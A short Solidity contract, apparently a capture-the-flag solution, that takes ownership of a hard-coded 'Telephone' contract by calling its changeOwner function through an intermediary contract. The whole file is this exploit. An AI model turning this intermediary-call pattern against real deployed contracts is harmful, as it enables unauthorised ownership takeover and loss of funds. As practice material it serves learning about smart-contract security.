pragma solidity ^0.8.0;

interface Telephone {
	function changeOwner(address _owner) external;
}

contract OwnTelephone {

	Telephone public t = Telephone(0x3958517761162f81e5a996f52B7FaF05E25C0CE1);

	function ownTelephone (address _address) public {
		t.changeOwner(_address);
	}

}